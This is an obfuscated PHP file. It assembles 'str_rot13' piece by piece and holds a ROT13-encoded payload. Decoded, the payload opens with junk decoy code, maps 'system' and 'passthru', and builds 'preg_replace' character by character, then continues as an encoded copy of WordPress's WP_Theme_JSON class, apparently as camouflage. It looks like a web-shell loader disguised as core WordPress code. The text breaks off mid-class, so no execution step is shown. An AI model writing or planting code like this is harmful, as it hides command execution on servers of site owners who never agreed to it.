<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * JC_Gurzr_WFBA pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gurzr
 * @fvapr 5.8.0
 */

/**
 * Pynff gung rapncfhyngrf gur cebprffvat bs fgehpgherf gung nqurer gb gur gurzr.wfba fcrp.
 *
 * Guvf pynff vf sbe vagreany pber hfntr naq vf abg fhccbfrq gb or hfrq ol rkgraqref (cyhtvaf naq/be gurzrf).
 * Guvf vf n ybj-yriry NCV gung znl arrq gb qb oernxvat punatrf. Cyrnfr,
 * hfr trg_tybony_frggvatf, trg_tybony_fglyrf, naq trg_tybony_fglyrfurrg vafgrnq.
 *
 * @npprff cevingr
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Gurzr_WFBA {

	/**
	 * Pbagnvare bs qngn va gurzr.wfba sbezng.
	 *
	 * @fvapr 5.8.0
	 * @ine neenl
	 */
	cebgrpgrq $gurzr_wfba = ahyy;

	/**
	 * Ubyqf oybpx zrgnqngn rkgenpgrq sebz oybpx.wfba
	 * gb or funerq nzbat nyy vafgnaprf fb jr qba'g
	 * cebprff vg gjvpr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Vavgvnyvmr nf na rzcgl neenl.
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $oybpxf_zrgnqngn = neenl();

	/**
	 * Gur PFF fryrpgbe sbe gur gbc-yriry cerfrg frggvatf.
	 *
	 * @fvapr 6.6.0
	 * @ine fgevat
	 */
	pbafg EBBG_PFF_CEBCREGVRF_FRYRPGBE = ':ebbg';

	/**
	 * Gur PFF fryrpgbe sbe gur gbc-yriry fglyrf.
	 *
	 * @fvapr 5.8.0
	 * @ine fgevat
	 */
	pbafg EBBG_OYBPX_FRYRPGBE = 'obql';

	/**
	 * Gur fbheprf bs qngn guvf bowrpg pna ercerfrag.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Nqqrq 'oybpxf'.
	 * @ine fgevat[]
	 */
	pbafg INYVQ_BEVTVAF = neenl(
		'qrsnhyg',
		'oybpxf',
		'gurzr',
		'phfgbz',
	);

	/**
	 * Cerfrgf ner n frg bs inyhrf gung freir
	 * gb obbgfgenc fbzr fglyrf: pbybef, sbag fvmrf, rgp.
	 *
	 * Gurl ner n haxrlrq neenl bs inyhrf fhpu nf:
	 *
	 *     neenl(
	 *       neenl(
	 *         'fyht'      => 'havdhr-anzr-jvguva-gur-frg',
	 *         'anzr'      => 'Anzr sbe gur HV',
	 *         <inyhr_xrl> => 'inyhr'
	 *       ),
	 *     )
	 *
	 * Guvf pbagnvaf gur arprffnel zrgnqngn gb cebprff gurz:
	 *
	 * - cngu             => Jurer gb svaq gur cerfrg jvguva gur frggvatf frpgvba.
	 * - cerirag_bireevqr => Qvfnoyrf bireevqr bs qrsnhyg cerfrgf ol gurzr cerfrgf.
	 *                       Gur eryngvbafuvc orgjrra jurgure gb bireevqr gur qrsnhygf
	 *                       naq jurgure gur qrsnhygf ner ranoyrq vf vairefr:
	 *                         - Vs qrsnhygf ner ranoyrq  => gurzr cerfrgf fubhyq abg or bireevqqra
	 *                         - Vs qrsnhygf ner qvfnoyrq => gurzr cerfrgf fubhyq or bireevqqra
	 *                       Sbe rknzcyr, n gurzr frgf qrsnhygCnyrggr gb snyfr,
	 *                       znxvat gur qrsnhyg cnyrggr uvqqra sebz gur hfre.
	 *                       Va gung pnfr, jr jnag nyy gur gurzr cerfrgf gb or cerfrag,
	 *                       fb gurl fubhyq bireevqr gur qrsnhygf ol frggvat guvf snyfr.
	 * - hfr_qrsnhyg_anzrf => jurgure gb hfr gur qrsnhyg anzrf
	 * - inyhr_xrl        => gur xrl gung ercerfragf gur inyhr
	 * - inyhr_shap       => bcgvbanyyl, vafgrnq bs inyhr_xrl, n shapgvba gb trarengr
	 *                       gur inyhr gung gnxrf n cerfrg nf na nethzrag
	 *                       (rvgure inyhr_xrl be inyhr_shap fubhyq or cerfrag)
	 * - pff_inef         => grzcyngr fgevat gb hfr va trarengvat gur PFF Phfgbz Cebcregl.
	 *                       Rknzcyr bhgchg: \"--jc--cerfrg--qhbgbar--oyhr: <inyhr>\" jvyy trarengr nf znal PFF Phfgbz Cebcregvrf nf cerfrgf qrsvarq
	 *                       fhofgvghgvat gur $fyht sbe gur fyht'f inyhr sbe rnpu cerfrg inyhr.
	 * - pynffrf          => neenl pbagnvavat n fgehpgher jvgu gur pynffrf gb
	 *                       trarengr sbe gur cerfrgf, jurer sbe rnpu neenl vgrz
	 *                       gur xrl vf gur pynff anzr naq gur inyhr gur cebcregl anzr.
	 *                       Gur \"$fyht\" fhofgevat jvyy or ercynprq ol gur fyht bs rnpu cerfrg.
	 *                       Sbe rknzcyr:
	 *                       'pynffrf' => neenl(
	 *                         '.unf-$fyht-pbybe'            => 'pbybe',
	 *                         '.unf-$fyht-onpxtebhaq-pbybe' => 'onpxtebhaq-pbybe',
	 *                         '.unf-$fyht-obeqre-pbybe'     => 'obeqre-pbybe',
	 *                       )
	 * - cebcregvrf       => neenl bs PFF cebcregvrf gb or hfrq ol xfrf gb
	 *                       inyvqngr gur pbagrag bs rnpu cerfrg
	 *                       ol zrnaf bs gur erzbir_vafrpher_cebcregvrf zrgubq.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `pbybe.qhbgbar` naq `glcbtencul.sbagSnzvyvrf` cerfrgf,
	 *              `hfr_qrsnhyg_anzrf` cerfrg xrl, naq fvzcyvsvrq gur zrgnqngn fgehpgher.
	 * @fvapr 6.0.0 Ercynprq `bireevqr` jvgu `cerirag_bireevqr` naq hcqngrq gur
	 *              `cerirag_bireevqr` inyhr sbe `pbybe.qhbgbar` gb hfr `pbybe.qrsnhygQhbgbar`.
	 * @fvapr 6.2.0 Nqqrq 'funqbj' cerfrgf.
	 * @fvapr 6.3.0 Ercynprq inyhr_shap sbe qhbgbar jvgu `ahyy`. Phfgbz cebcregvrf ner unaqyrq ol pynff-jc-qhbgbar.cuc.
	 * @fvapr 6.6.0 Nqqrq gur `qvzrafvbaf.nfcrpgEngvbf` naq `qvzrafvbaf.qrsnhygNfcrpgEngvbf` cerfrgf.
	 *              Hcqngrq gur 'cerirag_bireevqr' inyhr sbe sbag fvmr cerfrgf gb hfr 'glcbtencul.qrsnhygSbagFvmrf'
	 *              naq fcnpvat fvmr cerfrgf gb hfr `fcnpvat.qrsnhygFcnpvatFvmrf`.
	 * @ine neenl
	 */
	pbafg CERFRGF_ZRGNQNGN = neenl(
		neenl(
			'cngu'              => neenl( 'qvzrafvbaf', 'nfcrpgEngvbf' ),
			'cerirag_bireevqr'  => neenl( 'qvzrafvbaf', 'qrsnhygNfcrpgEngvbf' ),
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_xrl'         => 'engvb',
			'pff_inef'          => '--jc--cerfrg--nfcrpg-engvb--$fyht',
			'pynffrf'           => neenl(),
			'cebcregvrf'        => neenl( 'nfcrpg-engvb' ),
		),
		neenl(
			'cngu'              => neenl( 'pbybe', 'cnyrggr' ),
			'cerirag_bireevqr'  => neenl( 'pbybe', 'qrsnhygCnyrggr' ),
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_xrl'         => 'pbybe',
			'pff_inef'          => '--jc--cerfrg--pbybe--$fyht',
			'pynffrf'           => neenl(
				'.unf-$fyht-pbybe'            => 'pbybe',
				'.unf-$fyht-onpxtebhaq-pbybe' => 'onpxtebhaq-pbybe',
				'.unf-$fyht-obeqre-pbybe'     => 'obeqre-pbybe',
			),
			'cebcregvrf'        => neenl( 'pbybe', 'onpxtebhaq-pbybe', 'obeqre-pbybe' ),
		),
		neenl(
			'cngu'              => neenl( 'pbybe', 'tenqvragf' ),
			'cerirag_bireevqr'  => neenl( 'pbybe', 'qrsnhygTenqvragf' ),
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_xrl'         => 'tenqvrag',
			'pff_inef'          => '--jc--cerfrg--tenqvrag--$fyht',
			'pynffrf'           => neenl( '.unf-$fyht-tenqvrag-onpxtebhaq' => 'onpxtebhaq' ),
			'cebcregvrf'        => neenl( 'onpxtebhaq' ),
		),
		neenl(
			'cngu'              => neenl( 'pbybe', 'qhbgbar' ),
			'cerirag_bireevqr'  => neenl( 'pbybe', 'qrsnhygQhbgbar' ),
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_shap'        => ahyy, // PFF Phfgbz Cebcregvrf sbe qhbgbar ner unaqyrq ol oybpx fhccbegf va pynff-jc-qhbgbar.cuc.
			'pff_inef'          => ahyy,
			'pynffrf'           => neenl(),
			'cebcregvrf'        => neenl( 'svygre' ),
		),
		neenl(
			'cngu'              => neenl( 'glcbtencul', 'sbagFvmrf' ),
			'cerirag_bireevqr'  => neenl( 'glcbtencul', 'qrsnhygSbagFvmrf' ),
			'hfr_qrsnhyg_anzrf' => gehr,
			'inyhr_shap'        => 'jc_trg_glcbtencul_sbag_fvmr_inyhr',
			'pff_inef'          => '--jc--cerfrg--sbag-fvmr--$fyht',
			'pynffrf'           => neenl( '.unf-$fyht-sbag-fvmr' => 'sbag-fvmr' ),
			'cebcregvrf'        => neenl( 'sbag-fvmr' ),
		),
		neenl(
			'cngu'              => neenl( 'glcbtencul', 'sbagSnzvyvrf' ),
			'cerirag_bireevqr'  => snyfr,
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_xrl'         => 'sbagSnzvyl',
			'pff_inef'          => '--jc--cerfrg--sbag-snzvyl--$fyht',
			'pynffrf'           => neenl( '.unf-$fyht-sbag-snzvyl' => 'sbag-snzvyl' ),
			'cebcregvrf'        => neenl( 'sbag-snzvyl' ),
		),
		neenl(
			'cngu'              => neenl( 'fcnpvat', 'fcnpvatFvmrf' ),
			'cerirag_bireevqr'  => neenl( 'fcnpvat', 'qrsnhygFcnpvatFvmrf' ),
			'hfr_qrsnhyg_anzrf' => gehr,
			'inyhr_xrl'         => 'fvmr',
			'pff_inef'          => '--jc--cerfrg--fcnpvat--$fyht',
			'pynffrf'           => neenl(),
			'cebcregvrf'        => neenl( 'cnqqvat', 'znetva' ),
		),
		neenl(
			'cngu'              => neenl( 'funqbj', 'cerfrgf' ),
			'cerirag_bireevqr'  => neenl( 'funqbj', 'qrsnhygCerfrgf' ),
			'hfr_qrsnhyg_anzrf' => snyfr,
			'inyhr_xrl'         => 'funqbj',
			'pff_inef'          => '--jc--cerfrg--funqbj--$fyht',
			'pynffrf'           => neenl(),
			'cebcregvrf'        => neenl( 'obk-funqbj' ),
		),
	);

	/**
	 * Zrgnqngn sbe fglyr cebcregvrf.
	 *
	 * Rnpu ryrzrag vf n qverpg znccvat sebz gur PFF cebcregl anzr gb gur
	 * cngu gb gur inyhr va gurzr.wfba & oybpx nggevohgrf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `obeqre-*`, `sbag-snzvyl`, `sbag-fglyr`, `sbag-jrvtug`,
	 *              `yrggre-fcnpvat`, `znetva-*`, `cnqqvat-*`, `--jc--fglyr--oybpx-tnc`,
	 *              `grkg-qrpbengvba`, `grkg-genafsbez`, naq `svygre` cebcregvrf,
	 *              fvzcyvsvrq gur zrgnqngn fgehpgher.
	 * @fvapr 6.1.0 Nqqrq gur `obeqre-*-pbybe`, `obeqre-*-jvqgu`, `obeqre-*-fglyr`,
	 *              `--jc--fglyr--ebbg--cnqqvat-*`, naq `obk-funqbj` cebcregvrf,
	 *              erzbirq gur `--jc--fglyr--oybpx-tnc` cebcregl.
	 * @fvapr 6.2.0 Nqqrq `bhgyvar-*`, naq `zva-urvtug` cebcregvrf.
	 * @fvapr 6.3.0 Nqqrq `pbyhza-pbhag` cebcregl.
	 * @fvapr 6.4.0 Nqqrq `jevgvat-zbqr` cebcregl.
	 * @fvapr 6.5.0 Nqqrq `nfcrpg-engvb` cebcregl.
	 * @fvapr 6.6.0 Nqqrq `onpxtebhaq-[vzntr|cbfvgvba|ercrng|fvmr]` cebcregvrf.
	 * @fvapr 6.7.0 Nqqrq `onpxtebhaq-nggnpuzrag` cebcregl.
	 * @ine neenl
	 */
	pbafg CEBCREGVRF_ZRGNQNGN = neenl(
		'nfcrpg-engvb'                      => neenl( 'qvzrafvbaf', 'nfcrpgEngvb' ),
		'onpxtebhaq'                        => neenl( 'pbybe', 'tenqvrag' ),
		'onpxtebhaq-pbybe'                  => neenl( 'pbybe', 'onpxtebhaq' ),
		'onpxtebhaq-vzntr'                  => neenl( 'onpxtebhaq', 'onpxtebhaqVzntr' ),
		'onpxtebhaq-cbfvgvba'               => neenl( 'onpxtebhaq', 'onpxtebhaqCbfvgvba' ),
		'onpxtebhaq-ercrng'                 => neenl( 'onpxtebhaq', 'onpxtebhaqErcrng' ),
		'onpxtebhaq-fvmr'                   => neenl( 'onpxtebhaq', 'onpxtebhaqFvmr' ),
		'onpxtebhaq-nggnpuzrag'             => neenl( 'onpxtebhaq', 'onpxtebhaqNggnpuzrag' ),
		'obeqre-enqvhf'                     => neenl( 'obeqre', 'enqvhf' ),
		'obeqre-gbc-yrsg-enqvhf'            => neenl( 'obeqre', 'enqvhf', 'gbcYrsg' ),
		'obeqre-gbc-evtug-enqvhf'           => neenl( 'obeqre', 'enqvhf', 'gbcEvtug' ),
		'obeqre-obggbz-yrsg-enqvhf'         => neenl( 'obeqre', 'enqvhf', 'obggbzYrsg' ),
		'obeqre-obggbz-evtug-enqvhf'        => neenl( 'obeqre', 'enqvhf', 'obggbzEvtug' ),
		'obeqre-pbybe'                      => neenl( 'obeqre', 'pbybe' ),
		'obeqre-jvqgu'                      => neenl( 'obeqre', 'jvqgu' ),
		'obeqre-fglyr'                      => neenl( 'obeqre', 'fglyr' ),
		'obeqre-gbc-pbybe'                  => neenl( 'obeqre', 'gbc', 'pbybe' ),
		'obeqre-gbc-jvqgu'                  => neenl( 'obeqre', 'gbc', 'jvqgu' ),
		'obeqre-gbc-fglyr'                  => neenl( 'obeqre', 'gbc', 'fglyr' ),
		'obeqre-evtug-pbybe'                => neenl( 'obeqre', 'evtug', 'pbybe' ),
		'obeqre-evtug-jvqgu'                => neenl( 'obeqre', 'evtug', 'jvqgu' ),
		'obeqre-evtug-fglyr'                => neenl( 'obeqre', 'evtug', 'fglyr' ),
		'obeqre-obggbz-pbybe'               => neenl( 'obeqre', 'obggbz', 'pbybe' ),
		'obeqre-obggbz-jvqgu'               => neenl( 'obeqre', 'obggbz', 'jvqgu' ),
		'obeqre-obggbz-fglyr'               => neenl( 'obeqre', 'obggbz', 'fglyr' ),
		'obeqre-yrsg-pbybe'                 => neenl( 'obeqre', 'yrsg', 'pbybe' ),
		'obeqre-yrsg-jvqgu'                 => neenl( 'obeqre', 'yrsg', 'jvqgu' ),
		'obeqre-yrsg-fglyr'                 => neenl( 'obeqre', 'yrsg', 'fglyr' ),
		'pbybe'                             => neenl( 'pbybe', 'grkg' ),
		'grkg-nyvta'                        => neenl( 'glcbtencul', 'grkgNyvta' ),
		'pbyhza-pbhag'                      => neenl( 'glcbtencul', 'grkgPbyhzaf' ),
		'sbag-snzvyl'                       => neenl( 'glcbtencul', 'sbagSnzvyl' ),
		'sbag-fvmr'                         => neenl( 'glcbtencul', 'sbagFvmr' ),
		'sbag-fglyr'                        => neenl( 'glcbtencul', 'sbagFglyr' ),
		'sbag-jrvtug'                       => neenl( 'glcbtencul', 'sbagJrvtug' ),
		'yrggre-fcnpvat'                    => neenl( 'glcbtencul', 'yrggreFcnpvat' ),
		'yvar-urvtug'                       => neenl( 'glcbtencul', 'yvarUrvtug' ),
		'znetva'                            => neenl( 'fcnpvat', 'znetva' ),
		'znetva-gbc'                        => neenl( 'fcnpvat', 'znetva', 'gbc' ),
		'znetva-evtug'                      => neenl( 'fcnpvat', 'znetva', 'evtug' ),
		'znetva-obggbz'                     => neenl( 'fcnpvat', 'znetva', 'obggbz' ),
		'znetva-yrsg'                       => neenl( 'fcnpvat', 'znetva', 'yrsg' ),
		'zva-urvtug'                        => neenl( 'qvzrafvbaf', 'zvaUrvtug' ),
		'bhgyvar-pbybe'                     => neenl( 'bhgyvar', 'pbybe' ),
		'bhgyvar-bssfrg'                    => neenl( 'bhgyvar', 'bssfrg' ),
		'bhgyvar-fglyr'                     => neenl( 'bhgyvar', 'fglyr' ),
		'bhgyvar-jvqgu'                     => neenl( 'bhgyvar', 'jvqgu' ),
		'cnqqvat'                           => neenl( 'fcnpvat', 'cnqqvat' ),
		'cnqqvat-gbc'                       => neenl( 'fcnpvat', 'cnqqvat', 'gbc' ),
		'cnqqvat-evtug'                     => neenl( 'fcnpvat', 'cnqqvat', 'evtug' ),
		'cnqqvat-obggbz'                    => neenl( 'fcnpvat', 'cnqqvat', 'obggbz' ),
		'cnqqvat-yrsg'                      => neenl( 'fcnpvat', 'cnqqvat', 'yrsg' ),
		'--jc--fglyr--ebbg--cnqqvat'        => neenl( 'fcnpvat', 'cnqqvat' ),
		'--jc--fglyr--ebbg--cnqqvat-gbc'    => neenl( 'fcnpvat', 'cnqqvat', 'gbc' ),
		'--jc--fglyr--ebbg--cnqqvat-evtug'  => neenl( 'fcnpvat', 'cnqqvat', 'evtug' ),
		'--jc--fglyr--ebbg--cnqqvat-obggbz' => neenl( 'fcnpvat', 'cnqqvat', 'obggbz' ),
		'--jc--fglyr--ebbg--cnqqvat-yrsg'   => neenl( 'fcnpvat', 'cnqqvat', 'yrsg' ),
		'grkg-qrpbengvba'                   => neenl( 'glcbtencul', 'grkgQrpbengvba' ),
		'grkg-genafsbez'                    => neenl( 'glcbtencul', 'grkgGenafsbez' ),
		'svygre'                            => neenl( 'svygre', 'qhbgbar' ),
		'obk-funqbj'                        => neenl( 'funqbj' ),
		'jevgvat-zbqr'                      => neenl( 'glcbtencul', 'jevgvatZbqr' ),
	);

	/**
	 * Vaqverpg zrgnqngn sbe fglyr cebcregvrf gung ner abg qverpgyl bhgchg.
	 *
	 * Rnpu ryrzrag zncf sebz n PFF cebcregl anzr gb na neenl bs
	 * cnguf gb gur inyhr va gurzr.wfba & oybpx nggevohgrf.
	 *
	 * Vaqverpg cebcregvrf ner abg bhgchg qverpgyl ol `pbzchgr_fglyr_cebcregvrf`,
	 * ohg ner hfrq ryfrjurer va gur cebprffvat bs tybony fglyrf. Gur vaqverpg
	 * cebcregl vf hfrq gb inyvqngr jurgure n fglyr inyhr vf nyybjrq.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.6.0 Nqqrq onpxtebhaq-vzntr cebcregvrf.
	 * @ine neenl
	 */
	pbafg VAQVERPG_CEBCREGVRF_ZRGNQNGN = neenl(
		'tnc'              => neenl(
			neenl( 'fcnpvat', 'oybpxTnc' ),
		),
		'pbyhza-tnc'       => neenl(
			neenl( 'fcnpvat', 'oybpxTnc', 'yrsg' ),
		),
		'ebj-tnc'          => neenl(
			neenl( 'fcnpvat', 'oybpxTnc', 'gbc' ),
		),
		'znk-jvqgu'        => neenl(
			neenl( 'ynlbhg', 'pbagragFvmr' ),
			neenl( 'ynlbhg', 'jvqrFvmr' ),
		),
		'onpxtebhaq-vzntr' => neenl(
			neenl( 'onpxtebhaq', 'onpxtebhaqVzntr', 'hey' ),
		),
	);

	/**
	 * Cebgrpgrq fglyr cebcregvrf.
	 *
	 * Gurfr fglyr cebcregvrf ner bayl eraqrerq vs n frggvat ranoyrf vg
	 * ivn n inyhr bgure guna `ahyy`.
	 *
	 * Rnpu ryrzrag zncf gur fglyr cebcregl gb gur pbeerfcbaqvat gurzr.wfba
	 * frggvat xrl.
	 *
	 * @fvapr 5.9.0
	 * @ine neenl
	 */
	pbafg CEBGRPGRQ_CEBCREGVRF = neenl(
		'fcnpvat.oybpxTnc' => neenl( 'fcnpvat', 'oybpxTnc' ),
	);

	/**
	 * Gur gbc-yriry xrlf n gurzr.wfba pna unir.
	 *
	 * @fvapr 5.8.0 Nf `NYYBJRQ_GBC_YRIRY_XRLF`.
	 * @fvapr 5.9.0 Eranzrq sebz `NYYBJRQ_GBC_YRIRY_XRLF` gb `INYVQ_GBC_YRIRY_XRLF`,
	 *              nqqrq gur `phfgbzGrzcyngrf` naq `grzcyngrCnegf` inyhrf.
	 * @fvapr 6.3.0 Nqqrq gur `qrfpevcgvba` inyhr.
	 * @fvapr 6.6.0 Nqqrq `oybpxGlcrf` gb fhccbeg oybpx fglyr inevngvba gurzr.wfba cnegvnyf.
	 * @ine fgevat[]
	 */
	pbafg INYVQ_GBC_YRIRY_XRLF = neenl(
		'oybpxGlcrf',
		'phfgbzGrzcyngrf',
		'qrfpevcgvba',
		'cnggreaf',
		'frggvatf',
		'fyht',
		'fglyrf',
		'grzcyngrCnegf',
		'gvgyr',
		'irefvba',
	);

	/**
	 * Gur inyvq cebcregvrf haqre gur frggvatf xrl.
	 *
	 * @fvapr 5.8.0 Nf `NYYBJRQ_FRGGVATF`.
	 * @fvapr 5.9.0 Eranzrq sebz `NYYBJRQ_FRGGVATF` gb `INYVQ_FRGGVATF`,
	 *              nqqrq arj cebcregvrf sbe `obeqre`, `pbybe`, `fcnpvat`,
	 *              naq `glcbtencul`, naq eranzrq bguref nppbeqvat gb gur arj fpurzn.
	 * @fvapr 6.0.0 Nqqrq `pbybe.qrsnhygQhbgbar`.
	 * @fvapr 6.1.0 Nqqrq `ynlbhg.qrsvavgvbaf` naq `hfrEbbgCnqqvatNjnerNyvtazragf`.
	 * @fvapr 6.2.0 Nqqrq `qvzrafvbaf.zvaUrvtug`, 'funqbj.cerfrgf', 'funqbj.qrsnhygCerfrgf',
	 *              `cbfvgvba.svkrq` naq `cbfvgvba.fgvpxl`.
	 * @fvapr 6.3.0 Nqqrq fhccbeg sbe `glcbtencul.grkgPbyhzaf`, erzbirq `ynlbhg.qrsvavgvbaf`.
	 * @fvapr 6.4.0 Nqqrq fhccbeg sbe `ynlbhg.nyybjRqvgvat`, `onpxtebhaq.onpxtebhaqVzntr`,
	 *              `glcbtencul.jevgvatZbqr`, `yvtugobk.ranoyrq` naq `yvtugobk.nyybjRqvgvat`.
	 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `ynlbhg.nyybjPhfgbzPbagragNaqJvqrFvmr`,
	 *              `onpxtebhaq.onpxtebhaqFvmr` naq `qvzrafvbaf.nfcrpgEngvb`.
	 * @fvapr 6.6.0 Nqqrq fhccbeg sbe 'qvzrafvbaf.nfcrpgEngvbf', 'qvzrafvbaf.qrsnhygNfcrpgEngvbf',
	 *              'glcbtencul.qrsnhygSbagFvmrf', naq 'fcnpvat.qrsnhygFcnpvatFvmrf'.
	 * @ine neenl
	 */
	pbafg INYVQ_FRGGVATF = neenl(
		'nccrnenaprGbbyf'               => ahyy,
		'hfrEbbgCnqqvatNjnerNyvtazragf' => ahyy,
		'onpxtebhaq'                    => neenl(
			'onpxtebhaqVzntr' => ahyy,
			'onpxtebhaqFvmr'  => ahyy,
		),
		'obeqre'                        => neenl(
			'pbybe'  => ahyy,
			'enqvhf' => ahyy,
			'fglyr'  => ahyy,
			'jvqgu'  => ahyy,
		),
		'pbybe'                         => neenl(
			'onpxtebhaq'       => ahyy,
			'phfgbz'           => ahyy,
			'phfgbzQhbgbar'    => ahyy,
			'phfgbzTenqvrag'   => ahyy,
			'qrsnhygQhbgbar'   => ahyy,
			'qrsnhygTenqvragf' => ahyy,
			'qrsnhygCnyrggr'   => ahyy,
			'qhbgbar'          => ahyy,
			'tenqvragf'        => ahyy,
			'yvax'             => ahyy,
			'urnqvat'          => ahyy,
			'ohggba'           => ahyy,
			'pncgvba'          => ahyy,
			'cnyrggr'          => ahyy,
			'grkg'             => ahyy,
		),
		'phfgbz'                        => ahyy,
		'qvzrafvbaf'                    => neenl(
			'nfcrpgEngvb'         => ahyy,
			'nfcrpgEngvbf'        => ahyy,
			'qrsnhygNfcrpgEngvbf' => ahyy,
			'zvaUrvtug'           => ahyy,
		),
		'ynlbhg'                        => neenl(
			'pbagragFvmr'                   => ahyy,
			'jvqrFvmr'                      => ahyy,
			'nyybjRqvgvat'                  => ahyy,
			'nyybjPhfgbzPbagragNaqJvqrFvmr' => ahyy,
		),
		'yvtugobk'                      => neenl(
			'ranoyrq'      => ahyy,
			'nyybjRqvgvat' => ahyy,
		),
		'cbfvgvba'                      => neenl(
			'svkrq'  => ahyy,
			'fgvpxl' => ahyy,
		),
		'fcnpvat'                       => neenl(
			'phfgbzFcnpvatFvmr'   => ahyy,
			'qrsnhygFcnpvatFvmrf' => ahyy,
			'fcnpvatFvmrf'        => ahyy,
			'fcnpvatFpnyr'        => ahyy,
			'oybpxTnc'            => ahyy,
			'znetva'              => ahyy,
			'cnqqvat'             => ahyy,
			'havgf'               => ahyy,
		),
		'funqbj'                        => neenl(
			'cerfrgf'        => ahyy,
			'qrsnhygCerfrgf' => ahyy,
		),
		'glcbtencul'                    => neenl(
			'syhvq'            => ahyy,
			'phfgbzSbagFvmr'   => ahyy,
			'qrsnhygSbagFvmrf' => ahyy,
			'qebcPnc'          => ahyy,
			'sbagSnzvyvrf'     => ahyy,
			'sbagFvmrf'        => ahyy,
			'sbagFglyr'        => ahyy,
			'sbagJrvtug'       => ahyy,
			'yrggreFcnpvat'    => ahyy,
			'yvarUrvtug'       => ahyy,
			'grkgNyvta'        => ahyy,
			'grkgPbyhzaf'      => ahyy,
			'grkgQrpbengvba'   => ahyy,
			'grkgGenafsbez'    => ahyy,
			'jevgvatZbqr'      => ahyy,
		),
	);

	/**
	 * Gur inyvq cebcregvrf sbe sbagSnzvyvrf haqre frggvatf xrl.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	pbafg SBAG_SNZVYL_FPURZN = neenl(
		neenl(
			'sbagSnzvyl' => ahyy,
			'anzr'       => ahyy,
			'fyht'       => ahyy,
			'sbagSnpr'   => neenl(
				neenl(
					'nfpragBireevqr'        => ahyy,
					'qrfpragBireevqr'       => ahyy,
					'sbagQvfcynl'           => ahyy,
					'sbagSnzvyl'            => ahyy,
					'sbagSrngherFrggvatf'   => ahyy,
					'sbagFglyr'             => ahyy,
					'sbagFgergpu'           => ahyy,
					'sbagInevngvbaFrggvatf' => ahyy,
					'sbagJrvtug'            => ahyy,
					'yvarTncBireevqr'       => ahyy,
					'fvmrNqwhfg'            => ahyy,
					'fep'                   => ahyy,
					'havpbqrEnatr'          => ahyy,
				),
			),
		),
	);

	/**
	 * Gur inyvq cebcregvrf haqre gur fglyrf xrl.
	 *
	 * @fvapr 5.8.0 Nf `NYYBJRQ_FGLYRF`.
	 * @fvapr 5.9.0 Eranzrq sebz `NYYBJRQ_FGLYRF` gb `INYVQ_FGLYRF`,
	 *              nqqrq arj cebcregvrf sbe `obeqre`, `svygre`, `fcnpvat`,
	 *              naq `glcbtencul`.
	 * @fvapr 6.1.0 Nqqrq arj fvqr cebcregvrf sbe `obeqre`,
	 *              nqqrq arj cebcregl `funqbj`,
	 *              hcqngrq `oybpxTnc` gb or nyybjrq ng nal yriry.
	 * @fvapr 6.2.0 Nqqrq `bhgyvar`, naq `zvaUrvtug` cebcregvrf.
	 * @fvapr 6.3.0 Nqqrq fhccbeg sbe `glcbtencul.grkgPbyhzaf`.
	 * @fvapr 6.5.0 Nqqrq fhccbeg sbe `qvzrafvbaf.nfcrpgEngvb`.
	 * @fvapr 6.6.0 Nqqrq `onpxtebhaq` fho cebcregvrf gb gbc-yriry bayl.
	 * @ine neenl
	 */
	pbafg INYVQ_FGLYRF = neenl(
		'onpxtebhaq' => neenl(
			'onpxtebhaqVzntr'      => ahyy,
			'onpxtebhaqCbfvgvba'   => ahyy,
			'onpxtebhaqErcrng'     => ahyy,
			'onpxtebhaqFvmr'       => ahyy,
			'onpxtebhaqNggnpuzrag' => ahyy,
		),
		'obeqre'     => neenl(
			'pbybe'  => ahyy,
			'enqvhf' => ahyy,
			'fglyr'  => ahyy,
			'jvqgu'  => ahyy,
			'gbc'    => ahyy,
			'evtug'  => ahyy,
			'obggbz' => ahyy,
			'yrsg'   => ahyy,
		),
		'pbybe'      => neenl(
			'onpxtebhaq' => ahyy,
			'tenqvrag'   => ahyy,
			'grkg'       => ahyy,
		),
		'qvzrafvbaf' => neenl(
			'nfcrpgEngvb' => ahyy,
			'zvaUrvtug'   => ahyy,
		),
		'svygre'     => neenl(
			'qhbgbar' => ahyy,
		),
		'bhgyvar'    => neenl(
			'pbybe'  => ahyy,
			'bssfrg' => ahyy,
			'fglyr'  => ahyy,
			'jvqgu'  => ahyy,
		),
		'funqbj'     => ahyy,
		'fcnpvat'    => neenl(
			'znetva'   => ahyy,
			'cnqqvat'  => ahyy,
			'oybpxTnc' => ahyy,
		),
		'glcbtencul' => neenl(
			'sbagSnzvyl'     => ahyy,
			'sbagFvmr'       => ahyy,
			'sbagFglyr'      => ahyy,
			'sbagJrvtug'     => ahyy,
			'yrggreFcnpvat'  => ahyy,
			'yvarUrvtug'     => ahyy,
			'grkgNyvta'      => ahyy,
			'grkgPbyhzaf'    => ahyy,
			'grkgQrpbengvba' => ahyy,
			'grkgGenafsbez'  => ahyy,
			'jevgvatZbqr'    => ahyy,
		),
